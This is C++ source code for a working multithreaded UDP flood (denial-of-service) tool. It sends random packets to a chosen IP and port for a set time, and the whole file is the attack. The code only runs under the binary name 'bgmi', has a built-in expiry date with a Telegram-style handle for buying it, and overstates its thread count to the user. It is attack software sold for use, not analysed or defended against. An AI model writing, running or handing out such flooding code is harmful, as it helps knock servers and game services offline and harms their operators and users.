#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <random>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <arpa/inet.h>
#include <unistd.h>
#include <libgen.h>

using namespace std;

#define PINK "\033[95m"
#define RESET "\033[0m"

const int DEFAULT_THREADS = 200;
const int DISPLAY_THREADS = 20000;
const int PACKET_SIZE = 14;

vector<uint8_t> generate_payload(int size) {
    vector<uint8_t> payload(size);
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, 255);
    for (int i = 0; i < size; ++i) {
        payload[i] = dis(gen);
    }
    return payload;
}

void flood(const string& ip, int port, int duration, const vector<uint8_t>& payload) {
    sockaddr_in target{};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &target.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    auto end_time = chrono::steady_clock::now() + chrono::seconds(duration);
    while (chrono::steady_clock::now() < end_time) {
        sendto(sock, payload.data(), payload.size(), 0, (sockaddr*)&target, sizeof(target));
    }
    close(sock);
}

void live_timer(int seconds) {
    for (int i = seconds; i > 0; --i) {
        cout << "\r" << PINK << "Remaining Time: " << i << " seconds ⏳   " << flush;
        this_thread::sleep_for(chrono::seconds(1));
    }
    cout << "\r" << PINK << "Attack Finished ✅ Join @LASTWISHES0            \n" << RESET;
}

bool is_expired() {
    time_t now = time(0);
    tm expiry = {};
    expiry.tm_year = 2025 - 1900;
    expiry.tm_mon = 5 - 1;
    expiry.tm_mday = 5;
    time_t expiry_time = mktime(&expiry);
    return now > expiry_time;
}

bool check_binary_name(char* argv0) {
    string base = basename(argv0);
    return base == "bgmi";
}

int main(int argc, char* argv[]) {
    if (!check_binary_name(argv[0])) {
        cout << PINK << "Binary name will be bgmi ⚠️\n" << RESET;
        return 0;
    }

    if (is_expired()) {
        cout << PINK << "Binary has been expired. DM @LASTWISHES0 to buy 🛑\n" << RESET;
        return 0;
    }

    if (argc < 4 || argc > 5) {
        cout << PINK << "Usage: ./bgmi <ip> <port> <time> [threads] ⚙️\n" << RESET;
        return 0;
    }

    string ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc == 5) ? atoi(argv[4]) : DEFAULT_THREADS;

    vector<uint8_t> payload = generate_payload(PACKET_SIZE);

    cout << PINK << "Attack launched with " << DISPLAY_THREADS << " threads 🚀\n" << RESET;

    thread timer_thread(live_timer, duration);
    vector<thread> thread_list;
    for (int i = 0; i < threads; ++i) {
        thread_list.emplace_back(flood, ip, port, duration, payload);
    }

    for (auto& t : thread_list) t.join();
    timer_thread.join();

    return 0;
}
